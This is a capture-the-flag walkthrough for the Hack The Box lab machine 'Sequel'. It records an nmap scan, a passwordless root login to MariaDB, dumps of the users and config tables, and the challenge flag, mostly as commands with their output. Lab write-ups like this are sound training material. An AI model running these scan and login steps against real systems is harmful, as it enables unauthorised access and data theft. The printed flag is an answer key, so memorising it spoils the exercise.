---

---

# Sequel
---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.36.2 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 13:10 EDT
Nmap scan report for 10.129.36.2
Host is up (0.027s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, LongColumnFlag, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ODBCClient, IgnoreSigpipes, FoundRows, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: |'J~\3)r'gTOoay[=^Cq
|_  Auth Plugin Name: mysql_native_password
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.95 seconds
```

**Findings**
Port 3306 is running mysql Version: 5.5.5-10.3.27-MariaDB-0+deb10u1

---
## Foothold
Test for passwordless authentication

Command
```bash
mysql -h $IP -u root
```

Result
```bash
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 79
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

Gained access.



---
## Lateral Movement
---

See what databases are available.

Here are some basic commands.
| COMMAND | INFO | 
| ------- | ---- |
|SHOW databases; | Prints out the databases we can access.  
|USE {database_name}; | Set to use the database named {database_name}.  
|SHOW tables; | Prints out the available tables inside the current database. | 
|SELECT * FROM {table_name}; | Prints out all the data from the table {table_name}.|

Command
```bash
Show databases;
```

Result
```bash
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.029 sec)
```


htb seems weird. could it mean hack the box?

Command
```bash
USE htb;

```

Result
```bash
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]>
```

Time to look around

Command
```bash
Show tables;
```

Result
```bash
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.035 sec)

```

See what is in the users table.

Command
```bash
SELECT * FROM users;
```

Result
```bash
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.083 sec)

```

See whats in the config table.

Command
```bash
SELECT * FROM config;
```

Result
```bash
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.028 sec)

```


---
## Flags
id flag
```bash
7b4bec00d1a39e3dd4e021ec3d915da8
```



---
## Tags
---
#sql #mysql #MariaDB